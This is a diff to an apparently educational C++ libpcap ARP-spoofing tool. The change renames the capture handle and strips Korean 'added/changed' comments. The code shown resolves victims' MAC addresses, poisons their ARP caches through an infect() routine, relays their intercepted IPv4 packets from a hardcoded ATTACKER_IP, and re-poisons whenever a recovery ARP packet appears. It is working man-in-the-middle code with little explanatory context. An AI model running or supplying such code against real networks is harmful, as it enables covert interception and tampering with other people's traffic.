@@ -8,7 +8,7 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 
-#define ATTACKER_IP "172.20.10.8" // 실제 Attacker IP
+#define ATTACKER_IP "172.20.10.8" // Attacker IP
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -233,7 +233,7 @@ bool relay(pcap_t* pcap, const u_char* rawPacket, bpf_u_int32 length, const Mac&
 	eth->smac_ = attackerMac;
 	eth->dmac_ = session.targetMac_;
 
-	int result = pcap_sendpacket(handle, packet, length);
+	int result = pcap_sendpacket(pcap, packet, length);
 	delete[] packet;
 
 	if (result != 0) {
@@ -303,83 +303,83 @@ int main(int argc, char* argv[]) {
 	int sessionCount = (argc - 2) / 2;
 	Session* sessions = new Session[sessionCount];
 
-	for (int i = 0; i < sessionCount; ++i) { // 추가/변경
-		sessions[i].senderIp_ = Ip(argv[i * 2 + 2]); // 추가/변경
-		sessions[i].targetIp_ = Ip(argv[i * 2 + 3]); // 추가/변경
+	for (int i = 0; i < sessionCount; ++i) { 
+		sessions[i].senderIp_ = Ip(argv[i * 2 + 2]); 
+		sessions[i].targetIp_ = Ip(argv[i * 2 + 3]); 
 
-		sessions[i].senderMac_ = resolveMac( // 추가/변경
-			handle, attackerMac, attackerIp, sessions[i].senderIp_); // 추가/변경
-		sessions[i].targetMac_ = resolveMac( // 추가/변경
-			handle, attackerMac, attackerIp, sessions[i].targetIp_); // 추가/변경
+		sessions[i].senderMac_ = resolveMac( 
+			pcap, attackerMac, attackerIp, sessions[i].senderIp_); 
+		sessions[i].targetMac_ = resolveMac( 
+			pcap, attackerMac, attackerIp, sessions[i].targetIp_); 
 
-		if (sessions[i].senderMac_.isNull() || // 추가/변경
-			sessions[i].targetMac_.isNull()) { // 추가/변경
-			delete[] sessions; // 추가/변경
-			pcap_close(handle); // 추가/변경
-			return 1; // 추가/변경
-		} // 추가/변경
+		if (sessions[i].senderMac_.isNull() || 
+			sessions[i].targetMac_.isNull()) {
+			delete[] sessions; 
+			pcap_close(pcap); 
+			return 1; 
+		}
 	}
 
-	for (int i = 0; i < sessionCount; ++i) { // 추가/변경
-		if (!infect(handle, attackerMac, sessions[i])) { // 추가/변경
-			delete[] sessions; // 추가/변경
-			pcap_close(handle); // 추가/변경
-			return 1; // 추가/변경
-		} // 추가/변경
+	for (int i = 0; i < sessionCount; ++i) { 
+		if (!infect(pcap, attackerMac, sessions[i])) { 
+			delete[] sessions;
+			pcap_close(pcap); 
+			return 1;
+		} 
 	}
 
 
-	while (true) { // 추가/변경
-		struct pcap_pkthdr* header; // 추가/변경
-		const u_char* rawPacket; // 추가/변경
-		int result = pcap_next_ex(handle, &header, &rawPacket); // 추가/변경
+	while (true) { 
+		struct pcap_pkthdr* header; 
+		const u_char* rawPacket; 
+		int result = pcap_next_ex(pcap, &header, &rawPacket);
 
-		if (result == -1) { // 추가/변경
-			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(handle)); // 추가/변경
-			break; // 추가/변경
-		} // 추가/변경
-		if (result == -2) // 추가/변경
-			break; // 추가/변경
+		if (result == -1) { 
+			fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap)); 
+			break; 
+		} 
+		if (result == -2) 
+			break; 
 
-		if (result == 0) // 추가/변경
-			continue; // 추가/변경
-		if (header->caplen < sizeof(EthHdr)) // 추가/변경
-			continue; // 추가/변경
+		if (result == 0) 
+			continue; 
+		if (header->caplen < sizeof(EthHdr)) 
+			continue; 
 
-		const EthHdr* eth = reinterpret_cast<const EthHdr*>(rawPacket); // 추가/변경
-		uint16_t etherType = ntohs(eth->type_); // 추가/변경
+		const EthHdr* eth = reinterpret_cast<const EthHdr*>(rawPacket);
+		uint16_t etherType = ntohs(eth->type_); 
 
-		if (etherType == EthHdr::Ip4) { // 추가/변경
-			if (header->caplen != header->len) // 추가/변경
-				continue; // 추가/변경
+		if (etherType == EthHdr::Ip4) { 
+			if (header->caplen != header->len)
+				continue; 
 
-			for (int i = 0; i < sessionCount; ++i) { // 추가/변경
-				if (eth->smac_ == sessions[i].senderMac_ && // 추가/변경
-					eth->dmac_ == attackerMac) { // 추가/변경
-					relay(handle, rawPacket, header->caplen, // 추가/변경
-						attackerMac, sessions[i]); // 추가/변경
-					break; // 추가/변경
-				} // 추가/변경
-			} // 추가/변경
+			for (int i = 0; i < sessionCount; ++i) { 
+				if (eth->smac_ == sessions[i].senderMac_ && 
+					eth->dmac_ == attackerMac) { 
+					relay(pcap, rawPacket, header->caplen,
+						attackerMac, sessions[i]); 
+					break; 
+				} 
+			} 
 			continue;
 		}
 
-		if (etherType != EthHdr::Arp || // 추가/변경
-			header->caplen < sizeof(EthArpPacket)) // 추가/변경
-			continue; // 추가/변경
+		if (etherType != EthHdr::Arp || 
+			header->caplen < sizeof(EthArpPacket)) 
+			continue; 
 
-		const EthArpPacket* arpPacket = // 추가/변경
-			reinterpret_cast<const EthArpPacket*>(rawPacket); // 추가/변경
+		const EthArpPacket* arpPacket = 
+			reinterpret_cast<const EthArpPacket*>(rawPacket); 
 
-		if (ntohs(arpPacket->arp_.hrd_) != ArpHdr::ETHER || // 추가/변경
-			ntohs(arpPacket->arp_.pro_) != EthHdr::Ip4 || // 추가/변경
-			arpPacket->arp_.hln_ != Mac::Size || // 추가/변경
+		if (ntohs(arpPacket->arp_.hrd_) != ArpHdr::ETHER || 
+			ntohs(arpPacket->arp_.pro_) != EthHdr::Ip4 ||
+			arpPacket->arp_.hln_ != Mac::Size || 
 			arpPacket->arp_.pln_ != Ip::Size)
 			continue;
 
 		for (int i = 0; i < sessionCount; ++i) {
 			if (isRecoveryPacket(arpPacket, attackerMac, sessions[i]))
-				infect(handle, attackerMac, sessions[i]); 	
+				infect(pcap, attackerMac, sessions[i]); 	
 		}
 	}
 
